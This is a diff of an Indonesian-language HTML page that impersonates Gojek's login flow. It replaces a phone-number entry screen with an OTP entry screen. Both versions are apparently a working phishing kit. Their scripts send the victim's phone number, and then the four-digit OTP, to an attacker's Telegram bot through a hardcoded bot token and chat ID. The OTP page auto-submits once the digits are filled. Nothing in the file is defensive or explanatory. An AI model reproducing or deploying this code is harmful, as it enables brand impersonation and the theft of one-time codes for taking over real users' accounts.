@@ -2,316 +2,311 @@
 <head>
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1" name="viewport" />
-  <title>Masukkan nomor HP</title>
-  <link
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-    rel="stylesheet"
-  />
-  <link
-    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
-    rel="stylesheet"
-  />
+  <title>OTP Verification Gojek</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
     /* Reset and base */
     * {
       box-sizing: border-box;
     }
+
     body {
-      margin: 0;
       font-family: 'Inter', sans-serif;
       background-color: #ffffff;
-      color: #1a1a1a;
+      margin: 0;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      padding: 1.25rem 1.25rem 0 1.25rem; /* px-5 pt-5 */
+      justify-content: space-between;
+      color: #000000;
     }
+
+    /* Container */
+    .container {
+      padding: 1.25rem 1.25rem 0 1.25rem; /* px-5 pt-5 */
+      flex-grow: 1;
+    }
+
     /* Header */
-    header {
+    .header {
       display: flex;
       justify-content: space-between;
       align-items: center;
       margin-bottom: 1.5rem; /* mb-6 */
     }
-    header button {
-      font-size: 1.5rem; /* text-2xl */
-      color: #1a1a1a;
+
+    .btn-icon {
       background: none;
       border: none;
       cursor: pointer;
-    }
-    header .language-selector {
+      font-size: 1.25rem; /* text-xl */
+      color: #1f2937; /* gray-900 */
       display: flex;
       align-items: center;
-      gap: 0.5rem; /* space-x-2 */
-      border: 1px solid #d1d5db; /* border-gray-300 */
+      justify-content: center;
+    }
+
+    .btn-help {
+      background-color: #374151; /* gray-700 */
+      color: white;
       border-radius: 9999px; /* rounded-full */
-      padding: 0.375rem 0.75rem; /* py-1.5 px-3 */
-      font-size: 0.875rem; /* text-sm */
-      color: #4b5563; /* text-gray-700 */
-      user-select: none;
+      width: 2rem; /* w-8 */
+      height: 2rem; /* h-8 */
+      font-size: 1.125rem; /* text-lg */
     }
-    /* Main container */
-    main {
-      flex-grow: 1;
-      max-width: 28rem; /* max-w-md */
-      width: 100%;
-      margin-left: auto;
-      margin-right: auto;
-      display: flex;
-      flex-direction: column;
-    }
+
     /* Title */
     h1 {
-      font-weight: 800; /* font-extrabold */
+      font-weight: 600;
       font-size: 1.5rem; /* text-2xl */
-      margin-bottom: 0.5rem; /* mb-2 */
+      margin-bottom: 0.25rem; /* mb-1 */
+      line-height: 1.25;
     }
-    /* Paragraph */
-    p.description {
-      color: #4b5563; /* text-gray-700 */
+
+    /* Subtitle */
+    p.subtitle {
       font-size: 0.875rem; /* text-sm */
+      color: #4b5563; /* gray-700 */
       margin-bottom: 1.5rem; /* mb-6 */
-      line-height: 1.5;
     }
+
+    p.subtitle span {
+      font-weight: 400;
+      color: #4b5563;
+    }
+
     /* Label */
     label {
-      display: block;
-      font-weight: 600; /* font-semibold */
-      color: #1a1a1a;
-      margin-bottom: 0.25rem; /* mb-1 */
-      font-size: 0.875rem;
-    }
-    label span.required {
-      color: #dc2626; /* text-red-600 */
-    }
-    /* Form */
-    form {
-      margin-bottom: 1.5rem; /* mb-6 */
-    }
-    .input-group {
-      display: flex;
-      align-items: center;
-      gap: 0.75rem; /* space-x-3 */
-      margin-bottom: 0.25rem; /* mb-1 */
-    }
-    .country-code-btn {
-      display: flex;
-      align-items: center;
-      gap: 0.25rem; /* space-x-1 */
-      border: 1px solid #d1d5db; /* border-gray-300 */
-      border-radius: 9999px; /* rounded-full */
-      padding: 0.375rem 0.75rem; /* py-1.5 px-3 */
-      font-size: 0.875rem; /* text-sm */
-      color: #1a1a1a;
-      background: none;
-      cursor: default;
-      user-select: none;
-    }
-    .country-code-btn img {
-      border-radius: 0.125rem; /* rounded-sm */
-      width: 20px;
-      height: 15px;
-      object-fit: cover;
-    }
-    input[type="tel"] {
-      flex-grow: 1;
-      border: none;
-      border-bottom: 1px solid #000000;
-      font-weight: 800; /* font-extrabold */
-      font-size: 1.5rem; /* text-2xl */
-      color: #1a1a1a;
-      background: transparent;
-      padding: 0.125rem 0;
-      outline-offset: 2px;
-    }
-    input[type="tel"]::placeholder {
-      color: #9ca3af; /* placeholder-gray-400 */
-      font-weight: 800;
-    }
-    input[type="tel"]:focus {
-      outline: none;
-      border-bottom-color: #000000;
-    }
-    /* Submit button */
-    button#submitBtn {
-      width: 100%;
-      border-radius: 9999px; /* rounded-full */
-      padding: 0.75rem 0; /* py-3 */
-      font-weight: 600; /* font-semibold */
-      font-size: 1rem;
-      border: none;
-      transition: background-color 0.3s ease, color 0.3s ease;
-    }
-    button#submitBtn:disabled {
-      background-color: #D3D3D3; /* bg-gray-200 */
-      color: #FFFFFF; /* text-gray-600 */
-      cursor: not-allowed;
-    }
-    button#submitBtn:not(:disabled) {
-      background-color: #008000; /* bg-gray-100 */
-      color: #FFFFFF; /* text-gray-700 */
-      cursor: pointer;
-    }
-    /* Small text */
-    p.agreement {
+      font-weight: 600;
       font-size: 0.75rem; /* text-xs */
-      color: #FFFFFF; /* text-gray-700 */
-      margin-bottom: 1.5rem; /* mb-6 */
+      color: #4b5563; /* gray-700 */
+      display: block;
+      margin-bottom: 0.25rem; /* mb-1 */
     }
-    p.agreement a {
-      color: #059669; /* text-green-600 */
-      text-decoration: underline;
+
+    label span.required {
+      color: #dc2626; /* red-600 */
     }
-    /* Secondary button */
-    button.secondary-btn {
-      border: 1px solid #374151; /* border-gray-700 */
-      border-radius: 9999px; /* rounded-full */
-      padding: 0.375rem 1rem; /* py-1.5 px-4 */
+
+    /* OTP inputs container */
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      max-width: 20rem; /* max-w-xs */
+      margin-bottom: 1rem; /* mb-4 */
+      gap: 1.5rem; /* space-x-6 */
+    }
+
+    /* OTP input */
+    .otp-inputs input {
+      width: 2.5rem; /* w-10 */
+      height: 2.5rem; /* h-10 */
+      text-align: center;
+      font-size: 1.125rem; /* text-lg */
+      font-weight: 600;
+      border: 1px solid #d1d5db; /* border-gray-300 */
+      border-radius: 0.375rem; /* rounded */
+      outline-offset: 2px;
+      outline-color: transparent;
+      transition: outline-color 0.2s ease;
+    }
+
+    .otp-inputs input:focus {
+      outline-color: #2563eb; /* blue-600 */
+      border-color: #2563eb;
+    }
+
+    /* Timer container */
+    .timer-container {
+      display: flex;
+      align-items: center;
+      max-width: 2rem; /* max-w-xs */
+      margin-left: auto;
+      gap: 0.25rem; /* space-x-1 */
+      font-weight: 600;
       font-size: 0.875rem; /* text-sm */
-      font-weight: 600; /* font-semibold */
-      color: #1a1a1a;
-      background: none;
-      cursor: pointer;
-      margin-bottom: 2.5rem; /* mb-10 */
+      color: #000000;
     }
+
+    .timer-icon {
+      width: 1.25rem; /* w-5 */
+      height: 1.25rem; /* h-5 */
+      stroke: #047857; /* green-700 */
+      stroke-width: 3;
+      fill: none;
+    }
+
+    /* Horizontal line */
+    hr {
+      border: 1px solid #d1d5db; /* border-gray-300 */
+      margin-bottom: 1.5rem; /* mb-6 */
+      border-width: 1px 0 0 0;
+    }
+
+    /* Button */
+    .btn-secondary {
+      display: inline-block;
+      border: 1px solid #9ca3af; /* border-gray-400 */
+      border-radius: 9999px; /* rounded-full */
+      padding: 0.25rem 1rem; /* py-1 px-4 */
+      font-weight: 600;
+      font-size: 0.875rem; /* text-sm */
+      color: #000000;
+      background-color: transparent;
+      cursor: pointer;
+      transition: background-color 0.2s ease, color 0.2s ease;
+    }
+
+    .btn-secondary:hover {
+      background-color: #f3f4f6; /* gray-100 */
+    }
+
     /* Footer */
     .footer {
       display: flex;
       justify-content: center;
       align-items: center;
-      gap: 0.5rem; /* space-x-2 */
-      font-size: 0.75rem; /* text-xs */
-      color: #4b5563; /* text-gray-700 */
+      margin-bottom: 1.5rem; /* mb-6 */
+      gap: 0.25rem;
+      font-size: 1.50rem; /* text-xs */
+      color: #000000;
     }
+
+    /* Image */
     .footer img {
-      width: 60px;
-      height: 20px;
+      width: 3.75rem; /* w-60/16 = 3.75rem */
+      height: 1.25rem; /* h-20/16 = 1.25rem */
       object-fit: contain;
     }
+
+    /* Remove number input spinners */
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
+    input[type=number] {
+      -moz-appearance: textfield;
+    }
+
     /* Responsive */
-    @media (max-width: 40px) {
-      main {
+    @media (max-width: 640px) {
+      .otp-inputs {
         max-width: 100%;
+        gap: 1rem;
       }
     }
   </style>
 </head>
 <body>
-  <header>
-    <button aria-label="Back">
-      <i class="fas fa-arrow-left"></i>
-    </button>
-    <div class="language-selector">
-      <i class="fas fa-language"></i>
-      <span>Bahasa Indonesia</span>
-    </div>
-  </header>
-  <main>
-    <h1>Masukkan nomor HP</h1>
-    <p class="description">
-      Nomor HP kamu akan dipakai untuk proses verifikasi dan masuk ke akun
-      Gojek
-    </p>
-    <label for="phone"
-      >Nomor HP <span class="required">*</span></label
-    >
-    <form id="phoneForm">
-      <div class="input-group">
-        <button class="country-code-btn" type="button" tabindex="-1" aria-hidden="true">
-          <img
-            alt="Bendera Indonesia"
-            src="https://flagcdn.com/w20/id.png"
-            width="20"
-            height="15"
-          />
-          <span>+62</span>
-        </button>
-        <input
-          aria-label="Nomor HP"
-          id="phone"
-          name="phone"
-          pattern="[0-9x-]+"
-          placeholder="81x-xxx-xxx"
-          type="tel"
-          required
-        />
+  <div class="container">
+    <header class="header">
+      <button aria-label="Back" class="btn-icon" type="button">
+        <svg aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-left" viewBox="0 0 24 24" width="20" height="20"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      </button>
+      <button aria-label="Help" class="btn-icon btn-help" type="button">
+        <svg aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-help" viewBox="0 0 24 24" width="16" height="16"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 1 1 5.83 1c0 1.5-2 2.25-2 2.25"></path><line x1="12" y1="17" x2="12" y2="17"></line></svg>
+      </button>
+    </header>
+
+    <h1>Masukkan OTP yang kami SMS</h1>
+    <p class="subtitle">Kode-nya kami kirim ke <span>+628845454554</span></p>
+
+    <form id="otpForm" onsubmit="event.preventDefault(); handleSubmit();">
+      <label for="otp">OTP <span class="required">*</span></label>
+      <div class="otp-inputs">
+        <input aria-label="OTP digit 1" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
+        <input aria-label="OTP digit 2" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
+        <input aria-label="OTP digit 3" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
+        <input aria-label="OTP digit 4" autocomplete="one-time-code" inputmode="numeric" maxlength="1" pattern="[0-9]*" required type="text" />
       </div>
-      <button id="submitBtn" type="submit" disabled>Lanjut</button>
+      <div class="timer-container" aria-live="polite" aria-atomic="true">
+        <svg class="timer-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+          <path d="M4 12a8 8 0 018-8" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+        <span id="timer">00:45</span>
+      </div>
     </form>
-    <p class="agreement">
-      Saya menyetujui
-      <a href="#">Ketentuan Layanan</a> &amp;
-      <a href="#">Kebijakan Privasi</a> Gojek.
-    </p>
-    <button class="secondary-btn" type="button">
-      Ada kendala atau lupa nomor?
-    </button>
-    <div class="footer">
-      <span>from</span>
-      <img
-        alt="Logo goto berwarna hijau"
-        src="https://upload.wikimedia.org/wikipedia/commons/8/88/GoTo_logo.svg"
-        width="60"
-        height="20"
-      />
-    </div>
-  </main>
+
+    <hr />
+
+    <button class="btn-secondary" type="button">Coba Metode Lainnya</button>
+  </div>
+
+  <footer class="footer">
+    <p>from</p>
+    <img alt="goto logo in green text" src="https://upload.wikimedia.org/wikipedia/commons/8/88/GoTo_logo.svg" width="60" height="20" />
+  </footer>
 
   <script>
-    const phoneInput = document.getElementById("phone");
-    const submitBtn = document.getElementById("submitBtn");
-    const form = document.getElementById("phoneForm");
+    const inputs = document.querySelectorAll('input[type="text"]');
+    const timerElement = document.getElementById('timer');
+    let timeLeft = 45; // 45 seconds countdown
 
-    phoneInput.addEventListener("input", () => {
-      if (phoneInput.value.trim().length > 0) {
-        submitBtn.disabled = false;
-      } else {
-        submitBtn.disabled = true;
-      }
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1) {
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          } else {
+            // All inputs filled, submit form automatically
+            const allFilled = Array.from(inputs).every(i => i.value.length === 1);
+            if (allFilled) {
+              document.getElementById('otpForm').requestSubmit();
+            }
+          }
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
     });
 
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+    function updateTimer() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      if (timeLeft === 0) {
+        clearInterval(timerInterval);
+        // Auto submit form when timer reaches 0
+        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
+        if (allFilled) {
+          document.getElementById('otpForm').requestSubmit();
+        } else {
+          alert('Waktu habis, silakan isi OTP terlebih dahulu.');
+        }
+      }
+      timeLeft--;
+    }
 
-      const phoneNumber = phoneInput.value.trim();
+    const timerInterval = setInterval(updateTimer, 1000);
+    updateTimer();
 
-      // Ganti dengan token bot Telegram kamu
-      const BOT_TOKEN = "8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc";
-      // Ganti dengan chat ID kamu
-      const CHAT_ID = "7549590022";
+    async function handleSubmit() {
+      const otp = Array.from(inputs).map(i => i.value).join('');
 
-      const message = `GO-JEK Nomor HP: +62${phoneNumber}`;
+      // Ganti dengan token bot Telegram dan chat ID Anda
+      const telegramBotToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+      const telegramChatId = '7549590022';
+
+      const message = encodeURIComponent(`OTP Submitted: ${otp}`);
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${message}`;
 
       try {
-        const res = await fetch(
-          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: message,
-            }),
-          }
-        );
-
-        const data = await res.json();
-
-        if (data.ok) {
-          location.href = "pingojek.html";
-          phoneInput.value = "";
-          submitBtn.disabled = true;
+        const response = await fetch(url);
+        if (response.ok) {
+          alert('OTP berhasil dikirim ke Telegram.');
         } else {
-          alert("Gagal mengirim data ke Telegram.");
+          alert('Gagal mengirim OTP ke Telegram.');
         }
       } catch (error) {
-        alert("Terjadi kesalahan saat mengirim data.");
-        console.error(error);
+        alert('Terjadi kesalahan saat mengirim OTP ke Telegram.');
       }
-    });
+    }
   </script>
 </body>
-                                     </html>
+</html>
